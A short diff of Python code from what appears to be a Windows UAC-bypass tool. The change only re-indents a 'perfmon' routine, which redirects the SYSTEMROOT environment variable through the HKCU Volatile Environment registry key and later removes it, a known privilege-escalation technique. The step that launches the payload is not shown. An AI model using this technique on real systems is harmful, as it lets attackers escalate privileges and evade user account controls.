@@ -32,13 +32,13 @@ def perfmon(payload):
 	print_info("Attempting to change %systemroot% through volatile environment")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-					os.path.join("Volatile Environment"))
+								os.path.join("Volatile Environment"))
 								
 		_winreg.SetValueEx(key,
-				"SYSTEMROOT",
-				0,
-				_winreg.REG_SZ,
-				tempfile.gettempdir())
+							"SYSTEMROOT",
+							0,
+							_winreg.REG_SZ,
+							tempfile.gettempdir())
 		_winreg.CloseKey(key)
 		print_success("Registry %systemroot% key was created")
 	except Exception as error:
@@ -106,9 +106,9 @@ def perfmon(payload):
 	print_info("Attempting to remove %systemroot% registry key")	
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-					os.path.join("Volatile Environment"))
+								os.path.join("Volatile Environment"))
 		_winreg.DeleteValue(key,
-				"SYSTEMROOT")
+							"SYSTEMROOT")
 		print_success("Registry %systemroot% key was deleted")
 	except Exception as error:
 		print_error("Unable to delete %systemroot% registry key")
